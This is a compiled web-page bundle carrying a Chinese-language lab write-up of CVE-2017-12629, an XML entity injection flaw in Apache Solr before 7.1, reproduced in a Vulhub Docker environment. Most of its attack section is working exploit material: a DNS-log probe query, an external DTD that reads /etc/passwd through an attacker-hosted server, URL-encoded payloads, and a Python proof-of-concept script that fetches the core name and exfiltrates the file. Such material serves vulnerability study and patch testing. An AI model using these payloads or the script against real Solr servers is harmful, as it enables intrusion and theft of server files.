import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c as l,a as n,b as s,d as t,e as i}from"./app-58e4a7d6.js";const c={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"漏洞原理与分析可以参考：",-1),d={href:"https://www.exploit-db.com/exploits/43009/",target:"_blank",rel:"noopener noreferrer"},k={href:"https://paper.seebug.org/425/",target:"_blank",rel:"noopener noreferrer"},m=n("p",null,"Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。",-1),v={href:"https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE",target:"_blank",rel:"noopener noreferrer"},g=i(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Solr &lt; 7.1
Apache Lucene &lt; 7.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub运行漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011053067.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>先请求url地址获取 cores 内容：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8983/solr/admin/cores
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011059940.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问dnslog，验证漏洞是否存在（注意这里的<code>demo</code>是从上一步中得到的）：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://your-ip:8983/solr/demo/select?q={!xmlparser v=&#39;&lt;!DOCTYPE a SYSTEM &quot;http://xxxxx.ceye.io&quot;&gt;&lt;a&gt;&lt;/a&gt;&#39;}&amp;wt=xml
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011104795.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看dnslog得到请求，漏洞存在：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011105791.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在自己的服务器上写入一个可访问的XML文件solr_xxe.dtd，内容写入：</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">ent</span> <span class="token attr-name">&quot;&lt;!ENTITY</span> <span class="token attr-name">data</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name"><span class="token namespace">&#39;:</span>%file;&#39;</span><span class="token punctuation">&gt;</span></span>&quot;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后请求这个文件来读取服务器上的文件：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://your-ip:8983/solr/demo/select?&amp;q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fyour.domain%2fsolr_xxe.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;wt=xml&amp;defType=xmlparser

# 解码
/solr/demo/select?&amp;q=&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % ext SYSTEM &quot;http://your.domain/solr_xxe.dtd&quot;&gt;%ext;%ent;]&gt;&lt;r&gt;&amp;data;&lt;/r&gt;&amp;wt=xml&amp;defType=xmlparser
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011109416.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注意这里的payload进行了url编码,请求的文件为<code>http://your.domain/solr_xxe.dtd</code>，有更多需求自行更改写入的xml文件。</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># solr_xxe.dtd

&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#39;:%file;&#39;&gt;&quot;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json
<span class="token keyword">import</span> random

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    core_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>core_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        core_name <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功获得core_name,Url为：&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core_name <span class="token operator">+</span> <span class="token string">&quot;/config\\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Core name: &#39;</span><span class="token punctuation">,</span> core_name<span class="token punctuation">)</span>
        <span class="token keyword">return</span> core_name
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标Url漏洞利用失败\\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> dnslog_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dns_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;solr/%s/select?q={!xmlparser v=&#39;&lt;!DOCTYPE a SYSTEM &quot;%s&quot;&gt;&lt;a&gt;&lt;/a&gt;&#39;}&amp;wt=xml&quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>core_name<span class="token punctuation">,</span> dnslog_url<span class="token punctuation">)</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> dns_payload
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;HTTP ERROR 500&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 漏洞利用失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 请查看dnslog响应, DNSlog利用Url为：&quot;</span> <span class="token operator">+</span> vuln_url <span class="token operator">+</span> <span class="token string">&quot;/config\\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 漏洞利用失败 \\033[0m&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_3</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    file_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;solr/{}/select?&amp;q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fyour.vps.here%2fsolr_xxe.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;wt=xml&amp;defType=xmlparser&quot;&quot;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>core_name<span class="token punctuation">)</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> file_payload
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&quot;nologin&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 漏洞成功利用, Url为：/config\\033[0m \\n&quot;</span><span class="token punctuation">,</span> vuln_url <span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 响应为: \\n \\033[0m&quot;</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 漏洞利用失败 \\033[0m&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    core_name <span class="token operator">=</span> POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>   
    dnslog_url <span class="token operator">=</span> <span class="token string">&#39;http://{}.your.dnslog.here&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>core_name<span class="token punctuation">)</span>
    POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> dnslog_url<span class="token punctuation">)</span>
    POC_3<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011056712.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,26);function b(h,_){const a=p("ExternalLinkIcon");return o(),l("div",null,[r,u,n("ul",null,[n("li",null,[n("a",d,[s("https://www.exploit-db.com/exploits/43009/"),t(a)])]),n("li",null,[n("a",k,[s("https://paper.seebug.org/425/"),t(a)])])]),m,n("p",null,[s("本环境仅测试XXE漏洞，RCE和利用链，可以在 "),n("a",v,[s("https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE"),t(a)]),s(" 中查看。")]),g])}const f=e(c,[["render",b],["__file","Apache Solr XML 实体注入漏洞 CVE-2017-12629.html.vue"]]);export{f as default};
